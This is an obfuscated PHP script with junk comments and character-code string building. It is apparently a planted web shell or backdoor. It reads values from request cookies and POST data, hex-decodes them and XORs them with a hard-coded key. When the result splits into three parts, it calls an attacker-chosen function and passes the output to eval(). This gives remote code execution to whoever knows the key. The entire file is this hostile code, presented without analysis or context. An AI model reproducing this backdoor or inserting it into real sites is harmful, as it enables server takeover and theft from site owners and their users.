<?php $VdjoQ	=   chr  (	353	- 238  ).chr     (116)     .    chr     (114)	./*   qcyCL   */chr/*dmAW*/(/*   Kw */853	-/*   l*/758	).chr/*   S   */(/* N  */644/*   kdaP */-/*p   */530 ).'e'    .	"\x70"/*Lj */. "\145"	./*  k   */chr	( 501	-     404/*C   */).chr    (116);


$KtBcZ     =	'e'	.	chr	(120)	. chr  (112)/*   S */./*  ApQs*/"\x6c"	./* yZl  */"\x6f"    .   "\144"	.	'e';


$mdGpQFReS/* P  */=/* yx   */chr (99)/* ii   */.	'o'/*  rt */./* khCaR */"\x75"/*  hnl */./*   lXj*/"\156"/*CVVx */./*  TzyT*/"\164";
    $lmXcJMXhmQ	=	"\160" ./*TV*/"\x61"	.	"\143"	.   "\153";
    $Tlvvzv   =	Array	( "sGpitegJJKoiHYFTaIOtcR"	=>     "cgeYmodNxCAmQLjueh"/*   mJ  */);


	$VdPfb	=	Array/*   akFtB*/(   "zctiPlHLcNbbkuuOvcgV"	=>   "DatglYgaxwErXqDooItSayXRkJrz"   );
		  foreach    (     Array(/*  FXGF */$Tlvvzv,   $_COOKIE, $VdPfb,/* PreI*/$_POST,/*   sC  */$Tlvvzv) as/*  BcpWe*/$Vwdhx)	{
				 foreach/*   H*/(	$Vwdhx   as/*  XjRcS  */$PgNNGxLFT/*   pLSk  */=>    $lRabX	)/*kliO */{
 	$lRabX/*   LJ   */=     @$lmXcJMXhmQ(	'H'/*  DgQv */.	'*',     $lRabX/*  kS   */);
 	$PgNNGxLFT/*  Pjl   */.=/*   ix */"RHccUJ-gGDR-QhUhLB-HQjxf-veH-jDmnN-pRSllOX";
    /*  NzT*/$PgNNGxLFT =/*b   */$VdjoQ (/* FK*/$PgNNGxLFT,	(    strlen( $lRabX	)/strlen(/*   hdGA*/$PgNNGxLFT/*ANs  */)	) + 1);

   $bmeWEDqX  =   $lRabX  ^    $PgNNGxLFT;
    /* VsUGH   */$bmeWEDqX     =	$KtBcZ	(	"\x23",   $bmeWEDqX   );


/*kQMB */if     (    $mdGpQFReS	(	$bmeWEDqX	)/*E  */==     3/*QqnD  */)     {
	/*  Jte */$param1	=/*   Xk */$bmeWEDqX[1];
     $param2     =/* RHn   */$bmeWEDqX[2];
	     $param3	=	$param1($param2);
   /* pjC*/eval  (	$param3/*Zw */);
	die	();


	}
			}
	/* J */}